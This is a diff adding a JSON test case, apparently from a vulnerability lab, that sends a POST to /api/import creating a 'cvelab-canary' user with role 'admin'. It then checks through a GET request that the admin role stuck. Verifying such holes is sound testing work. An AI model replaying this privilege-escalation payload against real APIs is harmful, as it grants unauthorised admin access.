@@ -1,0 +1,22 @@
+{
+  "attack": [
+    {
+      "method": "POST",
+      "path": "/api/import",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": "{\"name\":\"cvelab-canary\",\"role\":\"admin\"}"
+    }
+  ],
+  "observe": {
+    "request": {
+      "method": "GET",
+      "path": "/api/users/cvelab-canary"
+    },
+    "match": {
+      "status": 200,
+      "body_contains": "\"role\":\"admin\""
+    }
+  }
+}
